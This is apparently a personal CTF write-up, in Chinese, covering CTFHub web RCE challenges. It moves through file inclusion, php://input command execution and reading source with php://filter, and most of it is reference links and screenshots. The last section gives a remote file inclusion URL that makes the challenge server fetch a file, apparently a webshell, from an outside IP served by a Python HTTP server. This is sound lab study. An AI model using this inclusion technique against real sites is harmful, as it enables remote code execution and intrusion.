# ctfhub-web-RCE

## 文件包含 v

![image.png](https://raw.githubusercontent.com/MarchPhantasia/pic/main/hexoblog/20240807214349.png)
## php://input
https://www.cnblogs.com/wjrblogs/p/12285202.html
https://blog.csdn.net/Xxy605/article/details/107644920
![image.png](https://raw.githubusercontent.com/MarchPhantasia/pic/main/hexoblog/20240807215334.png)

php://input 携带 post 数据，可以执行 php 命令。通过 php 执行 cmd 命令
![image.png](https://raw.githubusercontent.com/MarchPhantasia/pic/main/hexoblog/20240807220647.png)
![image.png](https://raw.githubusercontent.com/MarchPhantasia/pic/main/hexoblog/20240807221021.png)

## 读取源代码
https://writeup.ctfhub.com/Skill/Web/RCE/366Ttyc8tGBiCyo54pR8YR.html
- 存在使用 base 64 输出的可能性
- https://tyskill.github.io/posts/php_filter_%E8%BF%87%E6%BB%A4%E5%99%A8/

## 文件包含
https://writeup.ctfhub.com/Skill/Web/RCE/64arrieDUUPZTc1eFm6LLC.html
`python3 -m http.server 8000` 当前文件夹下启动服务器。
```
http://challenge-41e185ac7cf175e4.sandbox.ctfhub.com:10800/?file=http://8.140.204.97:8000/yjh.txt
```